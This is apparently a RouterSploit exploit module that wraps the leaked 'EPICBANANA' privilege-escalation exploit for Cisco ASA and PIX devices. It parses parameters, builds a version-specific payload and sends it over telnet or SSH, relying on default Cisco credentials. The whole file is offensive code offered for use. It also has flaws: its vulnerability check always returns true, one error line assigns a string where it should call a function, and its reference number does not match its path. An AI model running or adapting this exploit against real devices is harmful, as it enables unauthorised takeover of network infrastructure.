from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

import os
import sys
import warnings

sys.path.append("routersploit/modules/exploits/exploit-db-40271/EPBA/EPICBANANA/")

from params import *
from payload import *
from telnet import *
from ssh import *
from hexdump import *

class Exploit(HTTPClient):



    __info__ = {

        "name": "'EPICBANANA' Local Privilege Escalation",

        "description": "EPICBANANA A privilege escalation exploit against Cisco Adaptive Security Appliance"
                       "and Cisco Private Internet eXchange devices. Exploitation takes advantage of default"
                       "Cisco credentials (password: cisco)."
                       ,
        "authors": (

            "Shadow Brokers",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/40217",

        ),

        "devices": (

            "Cisco ASA / PIX"
        ),
    }

    def run(self):

        if self.check():
            print_success("Target seems to be vulnerable")


            warnings.filterwarnings("ignore", category=FutureWarning, append=1)

            params = Params()
            params.parse()
            params.display()

            if not os.path.isdir(params.versdir):
                print("cannot find version-specific dir (usually ./versions), are you in the correct dir?")
                sys.exit(1)

            ##
            sys.path.append(params.versdir)

            from util import build_version
            if not build_version(params):
                print_error = ("failed to build necessary version files!")
                sys.exit(1)

            ##
            payloader = Payload(params)
            if not payloader.load_version_module():
                print_error("unsupported target version!")
                print("  (are you sure you did \"make [version]\" in versions?)")
                sys.exit(1)
            payload = payloader.get_payload()
            if len(payload) == 0:
                print_error("failed to create version-specific payload!")
                sys.exit(1)

            if params.verbose:
                print_status("payload prepared")
            if params.debug:
                print_status("sending (" + str(len(payload)) + ") ")
                hexdump(payload, 16)

            if params.pretend:
                print_status("--pretend mode on, aborting exploit")
                sys.exit(0)

            ##
            status = -1

            if params.proto == "telnet":
                status = exploit_over_telnet(params, payload)
            elif params.proto == "ssh":
                status = exploit_over_ssh(params, payload)

            if status != -1:
                sys.exit(status)
            else:
                print_error("status of exploit unclear, bad news")
                sys.exit(1)


        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):

        return True
